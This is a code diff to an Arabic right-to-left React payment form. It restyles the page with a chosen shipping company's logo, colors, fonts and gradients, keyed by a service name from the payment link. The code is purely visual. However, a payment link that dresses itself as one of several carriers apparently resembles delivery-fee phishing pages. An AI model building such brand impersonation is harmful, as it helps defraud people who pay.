@@ -7,6 +7,7 @@ import { Badge } from "@/components/ui/badge";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { getServiceBranding } from "@/lib/serviceLogos";
+import { shippingCompanyBranding } from "@/lib/brandingSystem";
 import { getCountryByCode } from "@/lib/countries";
 import { getCurrencySymbol, formatCurrency } from "@/lib/countryCurrencies";
 import { getCompanyMeta } from "@/utils/companyMeta";
@@ -57,6 +58,7 @@ const PaymentRecipient = () => {
 
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
+  const companyBranding = shippingCompanyBranding[serviceKey.toLowerCase()] || null;
   const companyMeta = getCompanyMeta(serviceKey);
 
   // Use dynamic company meta for OG tags
@@ -214,8 +216,12 @@ const PaymentRecipient = () => {
         <meta name="twitter:image" content={dynamicImage} />
       </Helmet>
       <div 
-        className="min-h-screen bg-background" 
+        className="min-h-screen" 
         dir="rtl"
+        style={{
+          background: companyBranding?.colors.background || '#FFFFFF',
+          fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+        }}
       >
         {/* Hero Section */}
         <div className="relative w-full h-48 sm:h-64 overflow-hidden">
@@ -226,14 +232,21 @@ const PaymentRecipient = () => {
           />
           <div className="absolute inset-0 bg-gradient-to-b from-black/60 via-black/40 to-black/70" />
           
-          {/* Logo Overlay */}
+          {/* Logo Overlay - Enhanced with Company Branding */}
           <div className="absolute top-4 left-4 sm:top-6 sm:left-6">
             {branding.logo && (
-              <div className="bg-white rounded-2xl p-3 sm:p-4 shadow-lg">
+              <div 
+                className="bg-white rounded-2xl sm:rounded-3xl p-4 sm:p-6 shadow-2xl border-2"
+                style={{ 
+                  borderColor: companyBranding?.colors.primary || branding.colors.primary,
+                  boxShadow: `0 10px 40px -10px ${branding.colors.primary}50`
+                }}
+              >
                 <img 
                   src={branding.logo} 
                   alt={serviceName}
-                  className="h-12 sm:h-16 w-auto"
+                  className="h-16 sm:h-24 w-auto object-contain"
+                  style={{ maxWidth: '180px' }}
                   onError={(e) => e.currentTarget.style.display = 'none'}
                 />
               </div>
@@ -256,10 +269,24 @@ const PaymentRecipient = () => {
           
           <div className="max-w-2xl mx-auto">
             
-            <Card className="p-4 sm:p-8 shadow-2xl border-t-4" style={{ borderTopColor: branding.colors.primary }}>
+            <Card 
+              className="p-4 sm:p-8 shadow-2xl border-t-4" 
+              style={{ 
+                borderTopColor: companyBranding?.colors.primary || branding.colors.primary,
+                background: companyBranding?.colors.surface || '#FFFFFF',
+                borderRadius: companyBranding?.borderRadius.lg || '12px',
+                boxShadow: companyBranding?.shadows.lg || '0 10px 15px -3px rgba(0, 0, 0, 0.1)'
+              }}
+            >
               <form onSubmit={handleProceed}>
                 <div className="flex items-center justify-between mb-6 sm:mb-8">
-                  <h1 className="text-xl sm:text-3xl font-bold">
+                  <h1 
+                    className="text-xl sm:text-3xl font-bold"
+                    style={{
+                      color: companyBranding?.colors.text || '#1A1A1A',
+                      fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
+                    }}
+                  >
                     {payerType === "recipient" ? "معلومات المستلم" : "معلومات المرسل"}
                   </h1>
                   
@@ -340,9 +367,12 @@ const PaymentRecipient = () => {
                 <Button
                   type="submit"
                   size="lg"
-                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white"
+                  className="w-full text-sm sm:text-lg py-5 sm:py-7 text-white font-bold"
                   style={{
-                    background: `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`
+                    background: companyBranding?.gradients.primary || `linear-gradient(135deg, ${branding.colors.primary}, ${branding.colors.secondary})`,
+                    borderRadius: companyBranding?.borderRadius.md || '8px',
+                    boxShadow: companyBranding?.shadows.md || '0 4px 6px -1px rgba(0, 0, 0, 0.1)',
+                    fontFamily: companyBranding?.fonts.arabic || 'Cairo, Tajawal, sans-serif'
                   }}
                 >
                   <span className="ml-2">التالي</span>
